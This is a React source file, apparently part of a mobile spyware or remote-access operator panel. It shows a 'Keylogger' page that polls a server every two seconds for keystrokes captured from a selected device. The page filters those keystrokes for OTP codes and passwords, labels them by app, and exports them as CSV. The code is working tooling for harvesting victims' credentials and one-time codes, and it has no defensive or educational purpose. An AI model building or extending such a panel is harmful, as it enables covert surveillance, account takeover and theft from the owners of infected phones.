import React, { useState } from 'react';
import { useDeviceStore } from '../../store/deviceStore';
import { useQuery } from '@tanstack/react-query';
import axios from 'axios';
import { Keyboard, Download, Filter, Search, Clock } from 'lucide-react';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000';

export default function Keylogger() {
  const { selectedDevice } = useDeviceStore();
  const [filter, setFilter] = useState('all');

  const { data: keylogs = [], refetch } = useQuery({
    queryKey: ['keylogs', selectedDevice?.sessionId, filter],
    queryFn: async () => {
      const otpOnly = filter === 'otp';
      const res = await axios.get(
        `${API_URL}/api/devices/${selectedDevice.sessionId}/keylogs?otpOnly=${otpOnly}`,
        { headers: { Authorization: `Bearer ${localStorage.getItem('authToken')}` } }
      );
      return res.data;
    },
    enabled: !!selectedDevice,
    refetchInterval: 2000,
  });

  const exportKeylogs = () => {
    const csv = 'Keystroke,App,Time\n' + keylogs.map(k => `"${k.keystroke}","${k.appPackage}","${k.timestamp}"`).join('\n');
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogs_${selectedDevice.sessionId}.csv`;
    a.click();
  };

  return (
    <div className="p-6 space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-text mb-1">⌨️ Keylogger</h1>
          <p className="text-textMuted">Real-time keystroke capture and analysis</p>
        </div>
        <div className="flex gap-2">
          <select value={filter} onChange={(e) => setFilter(e.target.value)} className="input-field">
            <option value="all">All Keystrokes</option>
            <option value="otp">OTP Codes Only</option>
            <option value="password">Passwords Only</option>
          </select>
          <button onClick={exportKeylogs} className="btn-secondary flex items-center gap-2">
            <Download className="w-4 h-4" /> Export
          </button>
        </div>
      </div>

      {!selectedDevice ? (
        <div className="card text-center py-12">
          <Keyboard className="w-16 h-16 text-textMuted mx-auto mb-4" />
          <p className="text-textMuted">Select a device to view keylogger</p>
        </div>
      ) : (
        <>
          <div className="card">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold text-text">Live Keystrokes ({keylogs.length} total)</h3>
              <span className="text-xs text-textMuted flex items-center gap-1">
                <Clock className="w-3 h-3" /> Updated every 2s
              </span>
            </div>
            <div className="bg-surface/50 rounded-lg p-4 font-mono text-sm max-h-96 overflow-y-auto">
              {keylogs.length === 0 ? (
                <p className="text-textMuted text-center py-8">No keystrokes captured yet...</p>
              ) : (
                keylogs.slice(0, 100).map((log, i) => (
                  <div key={i} className="flex items-center gap-3 py-1 border-b border-border/30 last:border-0">
                    <span className="text-textMuted text-xs">{new Date(log.timestamp).toLocaleTimeString()}</span>
                    <span className={`flex-1 ${log.isOtp ? 'text-success font-bold' : log.isPassword ? 'text-accent' : 'text-text'}`}>
                      {log.keystroke}
                    </span>
                    {log.appPackage && <span className="text-xs text-textMuted">[{log.appPackage}]</span>}
                    {log.isOtp && <span className="px-1.5 py-0.5 bg-success/20 text-success text-xs rounded">OTP</span>}
                    {log.isPassword && <span className="px-1.5 py-0.5 bg-accent/20 text-accent text-xs rounded">PWD</span>}
                  </div>
                ))
              )}
            </div>
          </div>
        </>
      )}
    </div>
  );
}